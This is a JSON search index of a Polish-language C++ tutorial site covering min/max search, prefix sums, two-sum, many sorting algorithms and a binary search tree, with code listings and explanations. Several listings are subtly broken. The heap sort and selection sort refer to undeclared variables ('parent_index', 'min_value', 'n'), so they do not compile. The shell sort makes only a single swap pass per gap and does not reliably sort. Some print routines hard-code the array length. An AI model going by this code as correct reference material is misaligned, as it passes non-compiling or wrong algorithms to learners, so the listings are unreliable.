<p>Funkcja <code>findMin</code> dzia\u0142a nast\u0119puj\u0105co:</p> <ol> <li>Inicjalizuje zmienn\u0105 <code>min</code> jako pierwszy element tablicy.</li> <li>Przeszukuje tablic\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi aktualny element tablicy <code>tab[i]</code> jest mniejszy od aktualnej warto\u015bci <code>min</code>, aktualizuje <code>min</code> na <code>tab[i]</code>.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 tablic\u0119, zwraca <code>min</code>, kt\u00f3re jest najmniejsz\u0105 warto\u015bci\u0105 w tablicy.</li> </ol> <p>Podobnie, funkcja <code>findMax</code> dzia\u0142a w nast\u0119puj\u0105cy spos\u00f3b:</p> <ol> <li>Inicjalizuje zmienn\u0105 <code>max</code> jako pierwszy element tablicy.</li> <li>Przeszukuje tablic\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi aktualny element tablicy <code>tab[i]</code> jest wi\u0119kszy od aktualnej warto\u015bci <code>max</code>, aktualizuje <code>max</code> na <code>tab[i]</code>.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 tablic\u0119, zwraca <code>max</code>, kt\u00f3re jest najwi\u0119ksz\u0105 warto\u015bci\u0105 w tablicy.</li> </ol> <p>Funkcja <code>main</code> definiuje tablic\u0119 <code>tab</code> z \\(10\\) elementami, u\u017cywa funkcji <code>findMin</code> i <code>findMax</code>, aby znale\u017a\u0107 minimaln\u0105 i maksymaln\u0105 warto\u015b\u0107 w tablicy, a nast\u0119pnie wy\u015bwietla te warto\u015bci na ekranie.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#wyszukiwanie-indeksow-wartosci-minimum-i-maksimum","title":"Wyszukiwanie indeks\u00f3w warto\u015bci minimum i maksimum","text":""},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint findMinIndex(int n, int tab[]) {\n    int minInd = 0;\n\n    for (int i = 1; i &lt; n; i++) {\n        if (tab[i] &lt; tab[minInd]) {\n            minInd = i;\n        }\n    }\n\n    return minInd;\n}\n\nint findMaxIndex(int n, int tab[]) {\n    int maxInd = 0;\n\n    for (int i = 1; i &lt; n; i++) {\n        if (tab[i] &gt; tab[maxInd]) {\n            maxInd = i;\n        }\n    }\n\n    return maxInd;\n}\n\nint main() {\n    int tab[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n\n    int minInd = findMinIndex(n, tab);\n    int maxInd = findMaxIndex(n, tab);\n\n    cout &lt;&lt; \"Min Index: \" &lt;&lt; minInd &lt;&lt; endl;\n    cout &lt;&lt; \"Max Index: \" &lt;&lt; maxInd &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/min-or-max/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Program znajduje indeksy minimalnej i maksymalnej warto\u015bci w tablicy liczb ca\u0142kowitych. W tym celu wykorzystuje dwie funkcje: <code>findMinIndex</code> i <code>findMaxIndex</code>.</p> <p>Funkcja <code>findMinIndex</code> dzia\u0142a nast\u0119puj\u0105co:</p> <ol> <li>Inicjalizuje zmienn\u0105 <code>minInd</code> jako \\(0\\), co odpowiada indeksowi pierwszego elementu tablicy.</li> <li>Przechodzi przez tablic\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi warto\u015b\u0107 aktualnego elementu<code>tab[i]</code> jest mniejsza od warto\u015bci elementu o indeksie <code>minInd</code>, aktualizuje <code>minInd</code> na <code>i</code>.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 tablic\u0119, zwraca <code>minInd</code>, kt\u00f3re jest indeksem najmniejszego elementu w tablicy.</li> </ol> <p>Podobnie, funkcja <code>findMaxIndex</code> dzia\u0142a w nast\u0119puj\u0105cy spos\u00f3b:</p> <ol> <li>Inicjalizuje zmienn\u0105 <code>maxInd</code> jako \\(0\\), co odpowiada indeksowi pierwszego elementu tablicy.</li> <li>Przechodzi przez tablic\u0119 od drugiego elementu do ko\u0144ca.</li> <li>Je\u017celi warto\u015b\u0107 aktualnego elementu <code>tab[i]</code> jest wi\u0119ksza od warto\u015bci elementu o indeksie <code>maxInd</code>, aktualizuje <code>maxInd</code> na <code>i</code>.</li> <li>Po przej\u015bciu przez ca\u0142\u0105 tablic\u0119, zwraca <code>maxInd</code>, kt\u00f3re jest indeksem najwi\u0119kszego elementu w tablicy.</li> </ol> <p>Funkcja <code>main</code> definiuje tablic\u0119 <code>tab</code> z \\(10\\) elementami, u\u017cywa funkcji <code>findMinIndex</code> i <code>findMaxIndex</code> do znalezienia indeks\u00f3w minimalnej i maksymalnej warto\u015bci w tablicy, a nast\u0119pnie wy\u015bwietla te indeksy na ekranie.</p>"},{"location":"programming/c%2B%2B/algorithms/searching/prefix-sum/","title":"Sumy prefiksowe","text":""},{"location":"programming/c%2B%2B/algorithms/searching/prefix-sum/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/prefix-sum/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid computePrefixSum(int numbersCount, int numbersArray[],\n                      int prefixSumArray[]) {\n  prefixSumArray[0] = 0;\n  for (int i = 1; i &lt;= numbersCount; i++) {\n    prefixSumArray[i] = prefixSumArray[i - 1] + numbersArray[i - 1];\n  }\n}\n\nvoid answerQueries(int numbersCount, int numbersArray[], int queriesCount,\n                   int queriesArray[][2]) {\n  int prefixSumArray[numbersCount + 1];\n  computePrefixSum(numbersCount, numbersArray, prefixSumArray);\n  for (int i = 0; i &lt; queriesCount; i++) {\n    int result = prefixSumArray[queriesArray[i][1] + 1] -\n                 prefixSumArray[queriesArray[i][0]];\n    cout &lt;&lt; \"sum(\" &lt;&lt; queriesArray[i][0] &lt;&lt; \":\" &lt;&lt; queriesArray[i][1]\n         &lt;&lt; \") = \" &lt;&lt; result &lt;&lt; endl;\n  }\n}\n\nint main() {\n  int numbersCount = 10;\n  int numbersArray[10] = {8, 4, 1, 5, 8, 0, 12, 9, 26, 3};\n  int queriesCount = 3;\n  int queriesArray[3][2] = {{1, 5}, {0, 3}, {6, 9}};\n\n  answerQueries(numbersCount, numbersArray, queriesCount, queriesArray);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/prefix-sum/#opis-implementacji","title":"Opis implementacji","text":""},{"location":"programming/c%2B%2B/algorithms/searching/prefix-sum/#funkcja-computeprefixsum","title":"Funkcja <code>computePrefixSum</code>","text":"<ul> <li>Parametry:</li> <li><code>numbersCount</code>: liczba element\u00f3w w tablicy <code>numbersArray</code>.</li> <li><code>numbersArray</code>: tablica liczb, dla kt\u00f3rej obliczamy sumy prefiksowe.</li> <li> <p><code>prefixSumArray</code>: tablica, w kt\u00f3rej przechowujemy obliczone sumy prefiksowe.</p> </li> <li> <p>Dzia\u0142anie:</p> </li> <li>Inicjalizuje pierwszy element prefixSumArray na 0.</li> <li>Iteruje przez numbersArray i oblicza sumy prefiksowe, zapisuj\u0105c je w prefixSumArray.</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":""},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":""},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid sumOfTwoNaive(int n, int tab[], int sum) {\n    for (int i = 0; i &lt; n; i++) {\n        for (int j = i+1; j &lt; n; j++) {\n            if (tab[i] + tab[j] == sum) {\n                cout &lt;&lt; tab[i] &lt;&lt; \", \" &lt;&lt; tab[j] &lt;&lt; endl;\n                return;\n            }\n        }\n    }\n\n    cout &lt;&lt; -1 &lt;&lt; endl;\n}\n\nint main() {\n    int n = 10;\n    int tab[10] = {1, 2, 4, 6, 8, 9, 10, 12, 13, 15};\n    int sum = 18;\n\n    sumOfTwoNaive(n, tab, sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/c%2B%2B/algorithms/searching/sum-of-two/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid sumOfTwoOptimal(int n, int tab[], int sum) {\n    int left = 0;\n    int right = n-1;\n\n    while (left &lt; right &amp;&amp; tab[left] + tab[right] != sum) {\n        if (tab[left] + tab[right] &lt; sum) {\n            left++;\n        } else {\n            right--;\n        }\n    }\n\n    if (left &lt; right) {\n        cout &lt;&lt; tab[left] &lt;&lt; \", \" &lt;&lt; tab[right] &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; -1 &lt;&lt; endl;\n    }\n}\n\nint main() {\n    int n = 10;\n    int tab[10] = {1, 2, 4, 6, 8, 9, 10, 12, 13, 15};\n    int sum = 18;\n\n    sumOfTwoOptimal(n, tab, sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/bubble-sort/","title":"Sortowanie b\u0105belkowe","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/bubble-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/bubble-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid bubbleSort(int array[], int n) {\n    bool sorted = false;\n    int i = 0;\n    while (!sorted) {\n        sorted = true;\n        for(int j = n - 1; j &gt; i; j--) {\n            if(array[j] &lt; array[j-1]) {\n                swap(array[j], array[j-1]);\n                sorted = false;\n            }\n        }\n\n        i++;\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; 10; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    bubbleSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/cocktail-shaker-sort/","title":"Sortowanie koktajlowe","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/cocktail-shaker-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/cocktail-shaker-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid cocktailShakerSort(int array[], int n) {\n    for (int i = 0; i &lt;= n / 2; i++) {\n        for (int j = i; j &lt; n - i - 1; j++) {\n            if (array[j] &gt; array[j + 1]) {\n                swap(array[j], array[j + 1]);\n            }\n        }\n\n        for (int j = n - 1 - i; j &gt; i; j--) {\n            if (array[j] &lt; array[j - 1]) {\n                swap(array[j], array[j - 1]);\n            }\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    cocktailShakerSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/comb-sort/","title":"Sortowanie grzebieniowe","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/comb-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/comb-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid combSort(int array[], int n) {\n    int i, gap = n;\n    double shrink = 1.3;\n    bool sorted = false;\n    while (!sorted) {\n        gap = gap / shrink;\n        if (gap &lt;= 1) {\n            gap = 1;\n            sorted = true;\n        }\n\n        i = 0;\n\n        while(i + gap &lt; n) {\n            if (array[i] &gt; array[i + gap]) {\n                swap(array[i], array[i + gap]);\n                sorted = false;\n            }\n\n            i++;\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    combSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/counting-sort/","title":"Sortowanie przez zliczanie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/counting-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/counting-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid countingSort(int array[], int n, int m) {\n    int occurrences[m + 1] = {};\n    int k = 0;\n\n    for (int i = 0; i &lt; n; i++) {\n        occurrences[array[i]]++;\n    }\n\n    for (int i = 0; i &lt;= m; i++) {\n        for (int j = 0; j &lt; occurrences[i]; j++) {\n            array[k] = i;\n            k++;\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n    int m = 20;\n\n    countingSort(array, n, m);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/gnome-sort/","title":"Sortowanie gnoma","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/gnome-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>gnome-sort.md</p>"},{"location":"programming/c%2B%2B/algorithms/sorting/gnome-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid gnomeSort(int array[], int n) {\n    int i = 0;\n    while (i &lt; n) {\n        if (i == 0 || array[i] &gt;= array[i - 1]) {\n            i++;\n        } else {\n            swap(array[i], array[i - 1]);\n            i--;\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    gnomeSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/heap-sort/","title":"Sortowanie przez kopcowanie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/heap-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/heap-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid buildHeap(int array[], int n) {\n    for (int i = 1; i &lt; n; i++) {\n        int parentIndex = (i - 1) / 2;\n        int j = i;\n        while (j &gt; 0 &amp;&amp; array[j] &gt; array[parentIndex]) {\n            swap(array[j], array[parentIndex]);\n            j = parent_index;\n            parentIndex = (j - 1) / 2;\n        }\n    }\n}\n\nvoid heapSort(int array[], int n) {\n    for (int i = n - 1; i &gt; 0; i--) {\n        buildHeap(array, i + 1);\n        swap(array[0], array[i]);\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    heapSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/insertion-sort/","title":"Sortowanie przez wstawianie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/insertion-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/insertion-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid insertionSort(int array[], int n) {\n    for (int i = 1; i &lt; n; i++) {\n        int j = i;\n        while (j &gt; 0 &amp;&amp; array[j] &lt; array[j - 1]) {\n            swap(array[j], array[j - 1]);\n            j--;\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    insertionSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/merge-sort/","title":"Sortowanie przez scalanie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/merge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/merge-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid merge(int array[], int left, int right, int division) {\n    int mergedLength = right - left;\n    int merged[mergedLength];\n    int index1 = left;\n    int index2 = division;\n\n    for(int i = 0; i &lt; mergedLength ; i++) {\n        if(index1 &gt;= division) {\n            merged[i] = array[index2];\n            index2++;\n        } else if(index2 &gt;= right) {\n            merged[i] = array[index1];\n            index1++;\n        } else if(array[index1] &lt;= array[index2]) {\n            merged[i] = array[index1];\n            index1++;\n        } else {\n            merged[i] = array[index2];\n            index2++;\n        }\n    }\n\n    for(int i = left; i &lt; right; i++) {\n        array[i] = merged[i-left];\n    }\n}\n\nvoid mergeSort(int array[], int left, int right) {\n    if(right - left &lt;= 1) {\n        return;\n    }\n\n    int division = (left + right)/2;\n    mergeSort(array, left, division);\n    mergeSort(array, division, right);\n\n    merge(array, left, right, division);\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    mergeSort(array, 0, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/odd-even-sort/","title":"Sortowanie odd-even","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/odd-even-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/odd-even-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid oddEvenSort(int array[], int n) {\n    for (int i = 0; i &lt; n; i++) {\n        for (int j = i % 2 + 1; j &lt; n; j += 2) {\n            if (array[j] &lt; array[j - 1]) {\n                swap(array[j], array[j - 1]);\n            }\n        }\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; 10; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    oddEvenSort(array, n);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/quick-sort/","title":"Sortowanie szybkie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/quick-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/quick-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid quickSort(int tab[], int left, int right) {\n    if (right &lt;= left) {\n        return;\n    }\n\n    int pivot = tab[(left + right) / 2];\n    int i = left, j = right;\n    while (i &lt;= j) {\n        while (tab[i] &lt; pivot) {\n            i++;\n        }\n\n        while (pivot &lt; tab[j]) {\n            j--;\n        }\n\n        if (i &gt; j) {\n            break;\n        }\n\n        swap(tab[i], tab[j]);\n\n        i++;\n        j--;\n    }\n\n    quickSort(tab, left, j);\n    quickSort(tab, i, right);\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int tab[10] = {7, 2, -2, 7, 7, 293, 1, 5, 94, -5};\n    int n = 10;\n\n    quickSort(tab, 0, n - 1);\n\n    printArray(tab, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/selection-sort/","title":"Sortowanie przez wybieranie","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/selection-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/selection-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nint findMin(int array[], int from, int to) {\n    int minValue = array[from], minIndex = from;\n    for (int i = from + 1; i &lt; to; i++) {\n        if (array[i] &lt; min_value) {\n            minValue = array[i];\n            minIndex = i;\n        }\n    }\n\n    return minIndex;\n}\n\nvoid selectionSort(int array[], int n) {\n    for(int i = 0; i &lt; n; i++) {\n        int minIndex = findMin(array, i, n);\n\n        swap(array[i], array[minIndex]);\n    }\n}\n\nvoid printArray(int array[], int n) {\n    for(int i = 0; i &lt; n; ++i) {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n\n    selectionSort(array, 10);\n\n    printArray(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/shell-sort/","title":"Sortowanie Shella","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/shell-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/shell-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid shell_sort(int array[], int n)\n{\n    int gap = n / 2;\n\n    while(gap &gt; 0) {\n        for(int i = 0; i &lt; n - gap; i++) {\n            if (array[i] &gt; array[i + gap]) {\n                swap(array[i], array[i + gap]);\n            }\n        }\n\n        gap /= 2;\n    }\n}\n\nvoid print_array(int array[], int n)\n{\n    for (int i = 0; i &lt; n; ++i)\n    {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main()\n{\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    shell_sort(array, n);\n\n    print_array(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/slow-sort/","title":"Sortowanie wolne","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/slow-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/slow-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid slow_sort(int array[], int start_index, int end_index)\n{\n    if (start_index &gt;= end_index)\n    {\n        return;\n    }\n\n    int middle_index = (start_index + end_index) / 2;\n    slow_sort(array, start_index, middle_index);\n    slow_sort(array, middle_index + 1, end_index);\n    if (array[end_index] &lt; array[middle_index])\n    {\n        swap(array[end_index], array[middle_index]);\n    }\n\n    slow_sort(array, start_index, end_index - 1);\n}\n\nvoid print_array(int array[], int n)\n{\n    for (int i = 0; i &lt; n; ++i)\n    {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main()\n{\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    slow_sort(array, 0, n - 1);\n\n    print_array(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/sorting/stooge-sort/","title":"Sortowanie stooge","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/stooge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/sorting/stooge-sort/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nvoid stooge_sort(int array[], int i, int j)\n{\n    if (array[i] &gt; array[j])\n    {\n        swap(array[i], array[j]);\n    }\n\n    if (j - i &gt; 1)\n    {\n        int t = (j - i + 1) / 3;\n        stooge_sort(array, i, j - t);\n        stooge_sort(array, i + t, j);\n        stooge_sort(array, i, j - t);\n    }\n}\n\nvoid print_array(int array[], int n)\n{\n    for (int i = 0; i &lt; n; ++i)\n    {\n        cout &lt;&lt; array[i] &lt;&lt; \" \";\n    }\n\n    cout &lt;&lt; endl;\n}\n\nint main()\n{\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    int n = 10;\n\n    stooge_sort(array, 0, n - 1);\n\n    print_array(array, n);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/","title":"Drzewa przeszukiwa\u0144 binarnych","text":""},{"location":"programming/c%2B%2B/algorithms/structures/bst/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c%2B%2B/algorithms/structures/bst/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n\nusing namespace std;\n\nclass BST {\n    struct node {\n        int value;\n        node *left;\n        node *right;\n    };\n\n    node *root;\npublic:\n    BST() {\n        root = nullptr;\n    }\n\n    node* get_root() {\n        return root;\n    }\n\n    void insert(int value) {\n        node *new_node = new node();\n        new_node-&gt;value = value;\n        new_node-&gt;left = nullptr;\n        new_node-&gt;right = nullptr;\n\n        if(root == nullptr) {\n            root = new_node;\n            return;\n        }\n\n        node *current, *parent;\n        current = root;\n        while(current != nullptr) {\n            parent = current;\n            if(value &lt; current-&gt;value) {\n                current = current-&gt;left;\n            } else {\n                current = current-&gt;right;\n            }\n        }\n\n        if(value &lt; parent-&gt;value) {\n            parent-&gt;left = new_node;\n        } else {\n            parent-&gt;right = new_node;\n        }\n    }\n\n    void inorder(node *current) {\n        if(current == nullptr) {\n            return;\n        }\n\n        inorder(current-&gt;left);\n        cout &lt;&lt; current-&gt;value &lt;&lt; \" \";\n        inorder(current-&gt;right);\n    }\n\n    void preorder(node *current) {\n        if(current == nullptr) {\n            return;\n        }\n\n        cout &lt;&lt; current-&gt;value &lt;&lt; \" \";\n        preorder(current-&gt;left);\n        preorder(current-&gt;right);\n    }\n\n    void postorder(node *current) {\n        if(current == nullptr) {\n            return;\n        }\n\n        postorder(current-&gt;left);\n        postorder(current-&gt;right);\n        cout &lt;&lt; current-&gt;value &lt;&lt; \" \";\n    }\n\n    void clear(node *current) {\n        if(current == nullptr) {\n            return;\n        }\n\n        clear(current-&gt;left);\n        clear(current-&gt;right);\n        delete current;\n    }\n\n    ~BST() {\n        clear(root);\n    }\n};\n\nint main() {\n    int array[7] = {20, 10, 30, 5, 15, 25, 35};\n    BST bst = BST();\n\n    for(auto el : array) {\n        bst.insert(el);\n    }\n\n    cout &lt;&lt; \"Inorder: \";\n    bst.inorder(bst.get_root());\n    cout &lt;&lt; endl;\n\n    cout &lt;&lt; \"Preorder: \";\n    bst.preorder(bst.get_root());\n    cout &lt;&lt; endl;\n\n    cout &lt;&lt; \"Postorder: \";\n    bst.postorder(bst.get_root());\n    cout &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#opis-implementacji","title":"Opis implementacji","text":""},{"location":"programming/c%2B%2B/algorithms/structures/bst/#klasa-bst","title":"Klasa <code>BST</code>","text":""},{"location":"programming/c%2B%2B/algorithms/structures/bst/#struktura-node","title":"Struktura <code>node</code>","text":"<ul> <li>Reprezentuje pojedynczy w\u0119ze\u0142 drzewa.</li> <li>Zawiera trzy pola:</li> <li><code>int value</code>: warto\u015b\u0107 przechowywana w w\u0119\u017ale.</li> <li><code>node *left</code>: wska\u017anik na lewego potomka.</li> <li><code>node *right</code>: wska\u017anik na prawego potomka.</li> </ul>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#pole-root","title":"Pole <code>root</code>","text":"<p>Wska\u017anik na korze\u0144 drzewa.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#konstruktor-bst","title":"Konstruktor <code>BST()</code>","text":"<p>Inicjalizuje drzewo, ustawiaj\u0105c <code>root</code> na pusty wska\u017anik (<code>nullptr</code>).</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-get_root","title":"Metoda <code>get_root()</code>","text":"<p>Zwraca wska\u017anik na korze\u0144 drzewa.</p>"},{"location":"programming/c%2B%2B/algorithms/structures/bst/#metoda-insertint-value","title":"Metoda <code>insert(int value)</code>","text":"<ul> <li>Wstawia now\u0105 warto\u015b\u0107 do drzewa.</li> <li>Tworzy nowy w\u0119ze\u0142 z podan\u0105 warto\u015bci\u0105.</li> 